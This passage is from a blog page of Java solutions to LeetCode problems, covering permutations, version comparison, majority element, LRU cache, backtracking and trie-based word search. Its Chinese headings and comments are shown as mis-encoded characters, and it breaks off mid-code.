<h3 id="31-ä¸‹ä¸€ä¸ªæ’åˆ—"><a href="#31-ä¸‹ä¸€ä¸ªæ’åˆ—" class="headerlink" title=" 31. ä¸‹ä¸€ä¸ªæ’åˆ—"></a><a href="https://leetcode-cn.com/problems/next-permutation"> 31. ä¸‹ä¸€ä¸ªæ’åˆ—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä»åå¾€å‰, æ‰¾åˆ°ç¬¬ä¸€æ¬¡å‡åºçš„ä¸¤ä¸ªæ•°(ä¸‹æ ‡ä¸ºx,y, ç„¶åå°†y-lenè¿™éƒ¨åˆ†å‡åºæ’åº,</span></span><br><span class="line"><span class="comment">//ä»è¿™ä¸ªåºåˆ—æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¯”ä¸‹æ ‡xå¤§çš„æ•°,ç„¶åäº¤æ¢å³å¯</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">nextPermutation</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è¿™é‡Œçš„ä¸èƒ½æ˜¯nums.length - 1</span></span><br><span class="line">            Arrays.sort(nums, i, nums.length);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; nums.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> nums[i - <span class="number">1</span>];</span><br><span class="line">                    nums[i - <span class="number">1</span>] = nums[j];</span><br><span class="line">                    nums[j] = tmp;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] copy = Arrays.copyOf(nums, nums.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            nums[i] = copy[nums.length - i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="165-æ¯”è¾ƒç‰ˆæœ¬å·"><a href="#165-æ¯”è¾ƒç‰ˆæœ¬å·" class="headerlink" title="165. æ¯”è¾ƒç‰ˆæœ¬å·"></a><a href="https://leetcode-cn.com/problems/compare-version-numbers">165. æ¯”è¾ƒç‰ˆæœ¬å·</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareVersion</span><span class="params">(String version1, String version2)</span> &#123;</span><br><span class="line">        <span class="comment">//\\ä¼šè½¬ä¹‰æˆåæ–œæ ï¼Œåæ–œæ æœ¬èº«å°±æ˜¯è½¬ä¹‰ç¬¦ï¼Œæ‰€æœ‰å°±æˆäº†â€œ\.â€ï¼Œåœ¨è¿›è¡Œè½¬ä¹‰å°±æ˜¯.ï¼Œæ‰€ä»¥\\.å®é™…ä¸Šæ˜¯â€œ.â€ã€‚</span></span><br><span class="line">        String[] a1 = version1.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        String[] a2 = version2.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Math.max(a1.length, a2.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> (i &lt; a1.length ? Integer.parseInt(a1[i]) : <span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> (i &lt; a2.length ? Integer.parseInt(a2[i]) : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (a &lt; b) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a &gt; b)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="169-å¤šæ•°å…ƒç´ "><a href="#169-å¤šæ•°å…ƒç´ " class="headerlink" title=" 169. å¤šæ•°å…ƒç´ "></a><a href="https://leetcode-cn.com/problems/majority-element"> 169. å¤šæ•°å…ƒç´ </a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == min) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                count--;</span><br><span class="line">                <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">                    min = nums[i];</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="è®¾è®¡"><a href="#è®¾è®¡" class="headerlink" title="è®¾è®¡"></a>è®¾è®¡</h2><h3 id="146-LRU-ç¼“å­˜æœºåˆ¶-x2F"><a href="#146-LRU-ç¼“å­˜æœºåˆ¶-x2F" class="headerlink" title="146. LRU ç¼“å­˜æœºåˆ¶&#x2F;"></a><a href="https://leetcode-cn.com/problems/lru-cache/">146. LRU ç¼“å­˜æœºåˆ¶</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å“ˆå¸Œè¡¨+åŒå‘é“¾è¡¨</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> capacity;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">private</span> Node head;</span><br><span class="line">    <span class="keyword">private</span> Node tail;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer, Node&gt; map;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.capacity = capacity;</span><br><span class="line">        <span class="built_in">this</span>.size = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.head = <span class="keyword">new</span> <span class="title class_">Node</span>(-<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">this</span>.tail = <span class="keyword">new</span> <span class="title class_">Node</span>(-<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.pre  = head;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        moveToHead(node);</span><br><span class="line">        <span class="keyword">return</span> node.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">moveToHead</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        </span><br><span class="line">        addToHead(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(key, value);</span><br><span class="line">            map.put(key, node1);</span><br><span class="line">            addToHead(node1);</span><br><span class="line">            size++;</span><br><span class="line">            <span class="keyword">if</span> (size &gt; capacity) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node2</span> <span class="operator">=</span> removeTail();</span><br><span class="line">                map.remove(node2.key);</span><br><span class="line">                size--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            moveToHead(node);</span><br><span class="line">            node.val = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node <span class="title function_">removeTail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> tail.pre;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">removeNode</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        node.pre.next = node.next;</span><br><span class="line">        node.next.pre = node.pre;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addToHead</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        node.next = head.next;</span><br><span class="line">        node.pre  = head;</span><br><span class="line">        head.next.pre = node;</span><br><span class="line">        head.next = node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    Node pre, next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å›æº¯ç®—æ³•"><a href="#å›æº¯ç®—æ³•" class="headerlink" title="å›æº¯ç®—æ³•"></a>å›æº¯ç®—æ³•</h2><h3 id="46-å…¨æ’åˆ—"><a href="#46-å…¨æ’åˆ—" class="headerlink" title="46. å…¨æ’åˆ—"></a><a href="https://leetcode-cn.com/problems/permutations/">46. å…¨æ’åˆ—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">permute</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">boolean</span>[]  visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[nums.length];</span><br><span class="line">        dfs(nums, path, visited, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] nums, List&lt;Integer&gt; path, <span class="type">boolean</span>[] visited, List&lt;List&lt;Integer&gt;&gt; res)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (path.size() == nums.length) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visited[i]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            visited[i] = <span class="literal">true</span>;</span><br><span class="line">            path.add(nums[i]);</span><br><span class="line">            dfs(nums, path, visited, res);</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">            visited[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="78-å­é›†"><a href="#78-å­é›†" class="headerlink" title="78. å­é›†"></a><a href="https://leetcode-cn.com/problems/subsets/">78. å­é›†</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å›æº¯</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">subsets</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(<span class="number">0</span>, nums, path, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span>[] nums, List&lt;Integer&gt; path, List&lt;List&lt;Integer&gt;&gt; res)</span> &#123;</span><br><span class="line">        res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; nums.length; j++) &#123;</span><br><span class="line">            path.add(nums[j]);</span><br><span class="line">            dfs(j + <span class="number">1</span>, nums, path, res);</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="89-æ ¼é›·ç¼–ç -x2F"><a href="#89-æ ¼é›·ç¼–ç -x2F" class="headerlink" title="89. æ ¼é›·ç¼–ç &#x2F;"></a><a href="https://leetcode-cn.com/problems/gray-code/">89. æ ¼é›·ç¼–ç </a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¼‚æˆ–</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">grayCode</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        å…³é”®æ˜¯ææ¸…æ¥šæ ¼é›·ç¼–ç çš„ç”Ÿæˆè¿‡ç¨‹, G(i) = i ^ (i/2);</span></span><br><span class="line"><span class="comment">        å¦‚ n = 3: </span></span><br><span class="line"><span class="comment">        G(0) = 000, </span></span><br><span class="line"><span class="comment">        G(1) = 1 ^ 0 = 001 ^ 000 = 001</span></span><br><span class="line"><span class="comment">        G(2) = 2 ^ 1 = 010 ^ 001 = 011 </span></span><br><span class="line"><span class="comment">        G(3) = 3 ^ 1 = 011 ^ 001 = 010</span></span><br><span class="line"><span class="comment">        G(4) = 4 ^ 2 = 100 ^ 010 = 110</span></span><br><span class="line"><span class="comment">        G(5) = 5 ^ 2 = 101 ^ 010 = 111</span></span><br><span class="line"><span class="comment">        G(6) = 6 ^ 3 = 110 ^ 011 = 101</span></span><br><span class="line"><span class="comment">        G(7) = 7 ^ 3 = 111 ^ 011 = 100</span></span><br><span class="line"><span class="comment">        **/</span></span><br><span class="line">        List&lt;Integer&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1</span>&lt;&lt;n; ++i)</span><br><span class="line">            ret.add(i ^ i&gt;&gt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="79-å•è¯æœç´¢"><a href="#79-å•è¯æœç´¢" class="headerlink" title="79. å•è¯æœç´¢"></a><a href="https://leetcode-cn.com/problems/word-search/">79. å•è¯æœç´¢</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æŠŠåˆšè®¿é—®è¿‡çš„ç›´æ¥åŠ 256,ç„¶ååœ¨æ·±åº¦éå†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dfs(board, word, i , j , <span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, String word, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start == word.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= board.length || j &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || board[i][j] != word.charAt(start)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] += <span class="number">256</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> dfs(board, word ,i - <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i + <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i, j - <span class="number">1</span>, start + <span class="number">1</span>) || dfs(board, word ,i, j + <span class="number">1</span>, start + <span class="number">1</span>) ;</span><br><span class="line">        board[i][j] -= <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="212-å•è¯æœç´¢-II"><a href="#212-å•è¯æœç´¢-II" class="headerlink" title="212. å•è¯æœç´¢ II"></a><a href="https://leetcode-cn.com/problems/word-search-ii/">212. å•è¯æœç´¢ II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥è¢«æ„æˆçš„å•è¯</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">findWords</span><span class="params">(<span class="type">char</span>[][] board, String[] words)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// éå†æ¯ä¸ªå•è¯,åˆ¤æ–­æ˜¯å¦å¯ä»¥æ„æˆ</span></span><br><span class="line">        <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">            <span class="keyword">if</span> (exist(board, word)) &#123;</span><br><span class="line">                res.add(word);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dfs(board, word, i , j , <span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, String word, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start == word.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= board.length || j &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || board[i][j] != word.charAt(start)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] += <span class="number">256</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> dfs(board, word ,i - <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i + <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i, j - <span class="number">1</span>, start + <span class="number">1</span>) || dfs(board, word ,i, j + <span class="number">1</span>, start + <span class="number">1</span>) ;</span><br><span class="line">        board[i][j] -= <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// å›æº¯ + å­—å…¸æ ‘</span></span><br><span class="line"><span class="comment">// å¯ä»¥çœå»æŸ¥æ‰¾é‡å¤å•è¯çš„æ—¶é—´</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">findWords</span><span class="params">(<span class="type">char</span>[][] board, String[] words)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">WordTrie</span> <span class="variable">wordTrie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WordTrie</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">TrieNode</span> <span class="variable">root</span> <span class="operator">=</span> wordTrie.root;</span><br><span class="line">        <span class="keyword">for</span> (String word :</span><br><span class="line">                words) &#123;</span><br><span class="line">            wordTrie.insert(word);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dfs(board, root, i, j, res, visited);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, TrieNode cur, <span class="type">int</span> i, <span class="type">int</span> j, List&lt;String&gt; res, <span class="type">boolean</span>[][] visited)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= board.length || j &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || visited[i][j]) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur.child[board[i][j] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (cur.isEnd) &#123;</span><br><span class="line">            res.add(cur.val);</span><br><span class="line">            cur.isEnd = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dfs(board, cur, i + <span class="number">1</span>, j, res, visited);</span><br><span class="line">        dfs(board, cur, i - <span class="number">1</span>, j, res, visited);</span><br><span class="line">        dfs(board, cur, i, j + <span class="number">1</span>, res, visited);</span><br><span class="line">        dfs(board, cur, i, j - <span class="number">1</span>, res, visited);</span><br><span class="line">        visited[i][j] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">TrieNode</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> TrieNode[] child;</span><br><span class="line">        <span class="keyword">public</span> String val;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> isEnd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">TrieNode</span><span class="params">()</span> &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">            isEnd = <span class="literal">false</span>;</span><br><span class="line">            child = <span class="keyword">new</span> <span class="title class_">TrieNode</span>[<span class="number">26</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">                child[i] = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">WordTrie</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> TrieNode root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">WordTrie</span><span class="params">()</span> &#123;</span><br><span class="line">            root = <span class="keyword">new</span> <span class="title class_">TrieNode</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="type">TrieNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">            <span class="keyword">for</span> 